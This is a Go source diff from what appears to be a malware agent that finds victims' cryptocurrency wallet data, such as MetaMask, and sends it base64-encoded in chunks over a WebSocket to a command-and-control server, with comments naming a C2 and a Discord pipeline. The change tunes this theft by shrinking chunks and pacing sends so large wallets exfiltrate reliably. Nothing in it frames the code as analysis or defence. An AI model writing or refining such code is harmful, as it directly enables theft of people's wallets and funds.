@@ -8,6 +8,7 @@ import (
 	"recovery/recovery"
 	"sync"
 	"sync/atomic"
+	"time"
 )
 
 type HostInfo struct {
@@ -231,9 +232,11 @@ func handleFetchExtZip(payload []byte) {
 }
 
 const maxAutoDownloadSize = 50 * 1024 * 1024 // 50MB
-// Keep each plugin event small so Overlord WS/JSON doesn't drop MetaMask-sized zips.
-// 2.5 MiB raw → ~3.3 MiB base64 per chunk event.
-const maxWalletEventChunk = 2 * 1024 * 1024 // 2 MiB raw per event
+// Small WS events + pause between them so large wallets (MetaMask ~8–10MB) don't
+// stall the agent WebSocket (context deadline exceeded / closed connection).
+const maxWalletEventChunk = 512 * 1024             // 512 KiB raw → ~700 KiB base64
+const walletChunkSendDelay = 120 * time.Millisecond // pace chunks on the wire
+const walletBetweenDelay = 250 * time.Millisecond   // pause between wallets
 
 func handleScanWallets() {
 	defer func() {
@@ -278,9 +281,9 @@ func sendWalletAutoData(w recovery.WalletResult, data []byte) {
 		return
 	}
 
-	// Chunked transfer — Discord pipeline and C2 both reassemble on the server
+	// Chunked + paced transfer — avoids filling the agent→C2 WebSocket write buffer
 	total := (len(data) + maxWalletEventChunk - 1) / maxWalletEventChunk
-	log.Printf("[recovery] auto-download %q (%d bytes) → %d chunked events (event size limit)", w.Name, len(data), total)
+	log.Printf("[recovery] auto-download %q (%d bytes) → %d paced chunk events", w.Name, len(data), total)
 	sendEvent("wallet_auto_chunk_start", map[string]interface{}{
 		"name":      meta["name"],
 		"type":      meta["type"],
@@ -298,14 +301,18 @@ func sendWalletAutoData(w recovery.WalletResult, data []byte) {
 		}
 		chunk := data[start:end]
 		sendEvent("wallet_auto_chunk", map[string]interface{}{
-			"name":  w.Name,
-			"chunk": i + 1,
-			"chunks": total,
-			"size":  len(chunk),
+			"name":    w.Name,
+			"chunk":   i + 1,
+			"chunks":  total,
+			"size":    len(chunk),
 			"content": base64.StdEncoding.EncodeToString(chunk),
 		})
 		log.Printf("[recovery] wallet_auto_chunk %q %d/%d (%d bytes)", w.Name, i+1, total, len(chunk))
+		if i+1 < total {
+			time.Sleep(walletChunkSendDelay)
+		}
 	}
+	time.Sleep(walletChunkSendDelay)
 	sendEvent("wallet_auto_chunk_end", map[string]interface{}{
 		"name":   w.Name,
 		"chunks": total,
@@ -347,7 +354,10 @@ func autoDownloadWallets(wallets []recovery.WalletResult) {
 		}
 		sendWalletAutoData(w, data)
 		ok++
+		time.Sleep(walletBetweenDelay)
 	}
+	// Small pause so last chunks flush before wallet_auto_done / settle
+	time.Sleep(500 * time.Millisecond)
 	sendEvent("wallet_auto_done", map[string]interface{}{
 		"expected": len(wallets),
 		"sent":     ok,
